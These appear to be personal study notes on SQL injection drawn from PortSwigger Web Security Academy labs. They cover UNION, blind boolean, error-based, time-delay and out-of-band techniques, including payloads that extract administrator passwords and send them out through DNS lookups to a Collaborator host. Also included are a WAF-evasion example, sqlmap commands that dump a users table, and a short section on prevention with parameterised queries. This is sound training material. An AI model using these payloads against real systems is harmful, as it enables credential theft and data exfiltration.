https://portswigger.net/web-security/sql-injection/cheat-sheet
- Vulnerability that allows an attacker to interfere with the queries an application makes to its database 
	- allows the attacker to retrieve data that they normally do not have access to
- Can escalate the attacks to disrupt back-end infrastructure or DOS attacks
# Manual Detection Of SQLi
- The single quote character ' to web parameters or cookies and look for errors or other anomalies.
	- Qn: Why is there a need to use ' to break the syntax? 
		- Because the injection point starts at a string literal eg. 'admin'
		- The original request line would look like this : 
			- `https://insecure-website.com/products?category=Gifts`
		- The original query will hence look like this : 
			- `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
		- If we did not add ' before the `--`, the query will look like this : 
			- `SELECT * FROM products WHERE category = 'Gifts--' AND released = 1`
		- This does not comment out the rest of the query to give us what we want! Hence, we do the following: 
			- `https://insecure-website.com/products?category=Gifts'`
		- So as to get the following query: 
			- `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
		- Where everything after the `--` is commented out to give us all the products
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
# SQLi Injection Points 
- usually in the `WHERE` clause of a `SELECT` statement, but can also occur in other areas such as: 
	- In `UPDATE` statements, within the updated values or the `WHERE` clause.
	- In `INSERT` statements, within the inserted values.
	- In `SELECT` statements, within the table or column name.
	- In `SELECT` statements, within the `ORDER BY` clause.
# SQLi `UNION` Attacks
- Returns data from another table 
	`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- 2 requirements for `UNION` attacks to be successful: 
	- Individual queries must return the same number of columns 
		- This means finding out how many columns are returned from the original query 
	- The data types in each column must be compatible between individual queries
		- This means finding out which columns returned from the original query are of a suitable data type to hold the results from the injected query
## Determining The Number Of Columns Required
### Method 1: Injecting A Series of `ORDER BY` Clauses
- use column index and keep incrementing until an error occurs
	```
	' ORDER BY 1-- 
	' ORDER BY 2-- 
	' ORDER BY 3-- 
	etc.
	```
- once the column index number exceeds the actual number of columns in the table, the following error may occur: 
	1. `The ORDER BY position number 3 is out of range of the number of items in the select list.`
	2. no results may be returned 
### Method 2: `'UNION SELECT NULL--`
- inject a series of `UNION SELECT NULL--` clauses into the query, incrementing the number of `NULL` until the database returns an error 
	```
	' UNION SELECT NULL-- 
	' UNION SELECT NULL,NULL-- 
	' UNION SELECT NULL,NULL,NULL--
	etc.
	```
- If the number of `NULLS` does not match the number of columns, the following error may occur: 
	`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`
==Note** : This method is more effective than using `'ORDER BY` because it has a higher chance of giving a different response when the column count is correct==

## Finding Columns With Useful Data Type 
- important data is usually in string form  
- after determining the number of columns, we can replace each  `NULL` value in the injected query to check if it can hold a string literal, as seen below: 
	```
	' UNION SELECT 'a',NULL,NULL,NULL-- 
	' UNION SELECT NULL,'a',NULL,NULL-- 
	' UNION SELECT NULL,NULL,'a',NULL-- 
	' UNION SELECT NULL,NULL,NULL,'a'--
	```
- if the column cannot hold a string literal, the following error will be observed, indicating the data type of the column: 
	`Conversion failed when converting the varchar value 'a' to data type int.`
- if no error, and the application response will have some additional content including the injected string value then the relevant column, then the relevant column is suitable for retrieving string data
## Retrieving Multiple Values From A Single Column
- `' UNION SELECT username || '~' || password FROM users--`
- this will return:
	```
	administrator~s3cure
	wiener~peter
	carlos~montoya
	```
# Examining Database With SQLi 
- Find the type and version of  the database
- the tables and columns that the database contains 
## Querying Database Type & Version 
- Use `UNION` together with the respective `SELECT` statements:
	```
	Database type 	    Query
	
	Microsoft, MySQL 	SELECT @@version
	Oracle 	            SELECT * FROM v$version
	PostgreSQL 	        SELECT version()
	```
- `' UNION SELECT @@version--` may return : 
	```
	Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
	Mar 18 2018 09:11:49
	Copyright (c) Microsoft Corporation
	Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
	```
- Note**: remember that the number columns selected must match the total number of columns in the original query
## Listing The Tables & Columns In Database
	```
	Oracle 	    SELECT * FROM all_tables
		        SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
	Microsoft 	SELECT * FROM information_schema.tables
	            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
	PostgreSQL 	SELECT * FROM information_schema.tables
	            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
	MySQL 	    SELECT * FROM information_schema.tables
	            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
	```

# Blind SQL Injection 
- Occurs when a application is vulnerable to SQLi, but there is no change in responses (different results or errors) for us to verify that it is vulnerable 
- attacks like `UNION` attacks will not work it depends on a change in response to work 
- different methods must hence be employed
## Blind SQLi By Triggering Conditional Responses
- retrieving different responses conditionally based on the injected condition
	- example, if an application uses a tracking cookie such as : 
		`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
	- when the request is processed, it will submit a query to the database as follows: 
		`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
	- we can tell that there is a SQLi vulnerability when it displays a 'Welcome Back' message
- `TRUE` query to identify conditional message in response: 
	`' AND '1'='1`
	- using the `AND` logical operator means both statements must be true, triggering a 'Welcome Back' message
- `FALSE` query to identify conditional message NOT in response:  
	`'AND '1'='2'`
	- using the `AND` logical operator mean both first statement must be `TRUE` and second statement must be `FALSE` to display the 'Welcome Back' message, but no message is returned, meaning the overall statement is `FALSE`
- after determining if a change in response is triggered by a boolean, we can find the password of the user *administrator*
- for example, if there is a table called *users* with *administrator* we can confirm this by using: 
	- `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a` and going into Burp Intruder -> Grep-Match, clearing any existing entries and adding the 'Welcome Back' value to identify the `TRUE` condition. 
	- if it returns the 'Welcome Back' message, then we know that there is a user administrator with their password. 
	- keep incrementing the length of the password to determine the length of the password (until the Welcome Back message no longer appears)
- we can then find the password by testing the character at each position. 
	- use the Cluster Bomb feature in Burp Intruder to change to increment the position and find the character when a Welcome Back message is returned.
		- 1 payload for the index of the password (*Numbers* payload up till length of the password)
		- 1 payload to increment the value of the alphabet (`='a` to `='z`)
	- `AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username ='administrator')='$a$`
			![[Pasted image 20240502094625.png]]
Lab: [[Blind SQL Injection With Conditional Responses]]
# Error-Based SQL Injection 
- forcing the database to perform an operation that will result in an error
	- the point is to extract some useful information from the error message
## Triggering Conditional Errors 
- modify the query such that it causes a database error only if it is true
Example 1: 
	```
	TrackingId=x'||CAST((SELECT username FROM users LIMIT 1) AS int)--;
	OR
	TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;
	```
- As password is a string literal, it cannot be int, and hence this will produce an error as such: 
![[Pasted image 20240502131107.png]]
Example 2: 
Suppose 2 requests containing the following injections are sent: 
	```
	xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
	xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
	```
- case is used to test if a condition is true or not 
	-  With the first input, the CASE expression evaluates to 'a', which does not cause any error. 
	-  With the second input, it evaluates to 1/0, which causes a divide-by-zero error. 
- The second input will cause an error, hence we can concatenate the second query to the initial injected query: 
	- `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
	- this will cause an error that will reveal information. 
- Note**: 
	- the data types for the `CASE` statements for `THEN` and `ELSE` must be of the same data types
	- the `||` operator is used to concatenate strings together in Oracle
Lab: [[Blind SQL Injection With Conditional Errors]]
## Extracting Sensitive Information By Specific/Verbose SQL Error Messages
- adding a single quote `'` can cause a specific error message to appear: 
	`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
- can induce the application to retrieve some data in the error message 
	- use the `CAST` function which converts data types from one to another to achieve this. Example: 
		- `CAST((SELECT example_column FROM example_table) AS int)`
	- if it is a string data type, the following error message can appear: 
		- `ERROR: invalid input syntax for type integer: "Example data"`

Lab : [[Visible Error Based SQL Injection]]
# Blind SQLi Using Time Delays 
- usually when there is error, there is no time delay
- however if the injected query has a injected time delay based on a condition being true, if the application responds with a time delay, we can assume that the condition is true.
- different techniques and syntax apply to different databases
- start with a generic condition with a time delay with different syntax to check the database version 
	```
	'; IF (1=2) WAITFOR DELAY '0:0:10'--
	'; IF (1=1) WAITFOR DELAY '0:0:10'--
	```

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
- need to encode the first `;` at times for the application to recognise as a SQL query
# Blind SQLi Using Out Of Band Techniques
- the response from a SQLi is triggered in another system that we control, as opposed to to triggering a response in the application 
	- the application response does not depend on the query, returning data, database errors, or a time delay (all ineffective)
- by using out-of-band techniques we can infer information one piece at a time
	- data exfiltrated within the network interaction
- variety of network protocol can be used, DNS is most common
- use scanning : 
	1. Send request to Intruder
	2. Add the parameter payloads at the insertion point
		![[Screenshot 2024-05-03 at 10.01.47 AM 1.png]]
	3.  Right click and press scanned defined insertion points
		![[Screenshot 2024-05-03 at 10.08.20 AM.png]]
	4.  If there is a vulnerability, Burp will show under Target for the specific URL 
		![[Screenshot 2024-05-03 at 10.01.08 AM.png]]

## Extracting Data From DNS Lookup 
-  Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:
	```
	'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
	```
- This input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:
`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`
- scan the defined insertion points and and use the Collaborator for the payload.
- after sending to Repeater, modify the payload using Inspector and the respective pre-defined payloads: 
	```Burp 
	Oracle 	    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT                YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
	Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
		        create OR replace function f() returns void as $$
				declare c text;
				declare p text;
				begin
	PostgreSQL  SELECT into p (SELECT YOUR-QUERY-HERE);
	            c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
	            execute c;
	            END;
	            $$ language plpgsql security definer;
	            SELECT f();
	MySQL 	    The following technique works on Windows only:
	            SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
	```

# SQLi In Different Contexts
- can be used in any controllable input that is processed as a SQL query as opposed to just injecting the payload at the query string.
```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
- In this example, we obfuscate the attack to bypass any defence mechanisms such as WAF
	- by encoding or escaping characters in the injected query, we can bypass the security (usually in weak implementations)
	- we use an XML escape sequence (XML base SQLi) to encode the character `S` in `SELECT`
	- this will be decoded in the server-side before passing to the SQL interpreter
# Second-Order SQLi 
- First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way. 
- Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection. 
- Second-order SQL injection often occurs in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted. 
# Preventing SQLi
- use parameterised queries instead of string concatenation: 
- the following is a vulnerable query: 
	```
	String query = "SELECT * FROM products WHERE category = '"+ input + "'";
	Statement statement = connection.createStatement();
	ResultSet resultSet = statement.executeQuery(query);
	```
- this is a prevention method: 
	```
	PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
	statement.setString(1, input);
	ResultSet resultSet = statement.executeQuery();
	```
- Parameterized queries are effective for handling untrusted input in the WHERE clause and values in INSERT or UPDATE statements.
- They are not suitable for protecting against untrusted input in other parts of the query, such as table or column names, or the ORDER BY clause.
- Alternative approaches for protecting against SQL injection in these cases include whitelisting permitted input values or using different logic to achieve the required behavior.
- To ensure the effectiveness of parameterized queries, the string used in the query must always be a hard-coded constant and never contain variable data from any source.
- Avoid deciding case-by-case whether data is trusted and using string concatenation within the query for supposedly safe cases, as it's prone to errors and can lead to security vulnerabilities.
# SQL Map
```bash 
(1)
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --batch

(2) - Get Databases
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --dbs --batch

(3) - Get Tables
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" -D public --tables --batch

(4) - Dump Specific Table
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" -D public -T users --dump --batch
```
- use `*` to denote which parameter to inject in
- batch is to not ask for user input
## OOB With SQLMap
- SQLMap DNS Collaborator : https://portswigger.net/bappstore/e616dc27bf7a4c6598cfeeb70d5ca81c